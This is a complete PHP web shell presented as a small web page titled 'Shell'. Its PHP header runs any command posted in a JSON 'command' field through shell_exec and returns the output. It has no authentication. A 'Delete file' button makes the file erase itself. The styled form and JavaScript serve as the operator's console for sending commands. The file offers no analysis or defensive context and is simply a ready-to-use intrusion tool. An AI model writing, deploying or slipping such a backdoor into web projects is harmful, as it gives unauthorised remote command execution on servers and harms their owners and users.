<?php if($_SERVER["REQUEST_METHOD"]=="POST"){$data=json_decode(file_get_contents("php://input"));if(isset($data->action)){unlink(__FILE__);return;}else if(isset($data->command) && !empty($data->command)){$cmd=shell_exec($data->command);print $cmd;}return;} ?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Shell</title>
    <style>body{background-color:#000000}.shell--container{height:100vh;text-align:center;margin:15rem auto}.shell--container .shell-name{position:relative;bottom:3rem;color:#fff;font-family:Arial, Helvetica, sans-serif;font-weight:bold;text-transform:uppercase}.shell--container button,.shell--container input{margin:0 auto;display:block}.shell--container input{width:300px;padding:13px;border-radius:5px;outline:0;border:0;font-family:sans-serif;font-size:14pt;background-color:transparent;color:#fff}.shell--container button#delete{background-color:rgb(29, 29, 29) !important}.shell--container button{margin-top:20px;border:0;background-color:rgb(189, 25, 71);transition:background-color 500ms ease-in-out;color:#fff;padding:14px;width:16rem;border-radius:200px;cursor:pointer;font-weight:bold;font-family:arial, sans-serif;text-transform:uppercase;font-size:11pt}.shell--container button span{font-size:9pt}.shell--container button:hover{background-color:rgb(91, 13, 35)}#output{margin-top:2rem;font-family:Arial, Helvetica, sans-serif;color:#fff}</style>
</head>
<body>
    <div class="shell--container">
        <h1 class="shell-name">みんな悪いシェル</h1>
        <form action="" method="POST">
            <input type="text" placeholder="I am waiting for you command...">
            <button type="submit">Execute <span>or press enter</span></button>
            <button id="delete">Delete file</button>
            <div id="output"></div>
        </form>
    </div>
    <script>let form=document.querySelector("form");let fdelete=document.getElementById("delete");fdelete.onclick=(e)=>{e.preventDefault();fetch(form.action,{method:'POST',body:JSON.stringify({action:'delete'})})};form.onsubmit=(e)=>{e.preventDefault();fetch(form.action,{method:'POST',body:JSON.stringify({command:document.querySelector("input[type='text']").value})}).then(response=>response.text()).then(data=>{console.log(data);document.getElementById("output").innerText=data})}</script>
</body>
</html>